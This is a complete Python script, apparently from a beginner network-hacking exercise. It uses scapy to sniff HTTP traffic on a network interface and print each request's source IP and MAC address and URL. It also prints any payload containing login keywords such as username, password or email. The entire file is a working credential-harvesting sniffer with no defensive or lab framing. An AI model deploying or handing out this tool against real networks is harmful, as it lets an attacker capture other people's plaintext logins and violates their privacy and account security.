#!/usr/bin/env python3

import argparse
import scapy.all as scapy
from scapy.layers import http

def get_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-i", "--interface", help="Provide Network Interface")
    options = arg_parser.parse_args()

    if not options.interface:
        arg_parser.print_help()
        exit()
    return options

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function to get login information from packets if any
def get_login_info(packet):
    # Keywords used to check for form logins in the sniff URLs
    keywords = ["username", "password", "uname", "pass", "login", "email", "user"]
    # Check if packet has Raw layer
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        # Check payload for keywords of login form and return the payload in the list
        info_list = [load for keyword in keywords if keyword in load]
        return info_list

def get_source_info(packet):
    return packet[scapy.IP].src + " (" + packet[scapy.Ether].src + ")"

# process_packet() will process the packets that are sniffed
def process_packet(packet):
    # Check only for packets which include the HTTP Request:
    if packet.haslayer(http.HTTPRequest):

        # Print IP and MAC of target
        print("[/] \033[92mSource Info: \033[0m" + get_source_info(packet))
        # Print the request url for the HTTP packet
        print("[/] \033[93mHTTP Request: \033[0m" + get_url(packet).decode())

        # Extracting login information from the HTTP packets if any
        login_info = get_login_info(packet)
        # Print login info if found in packet
        if login_info : print("[/] \033[94mLogin info: \033[0m\033[96m\033[1m" + login_info[0] + "\033[0m")

def sniff(interface):
    # Use in built scapy sniff function by passing interface and the function to process sniffed packets
    scapy.sniff(iface=interface, store=False, prn=process_packet)

if __name__ == "__main__":
    # Get the interface you want to sniff packets from
    options = get_args()
    # Call the Sniff function on the interface
    sniff(options.interface)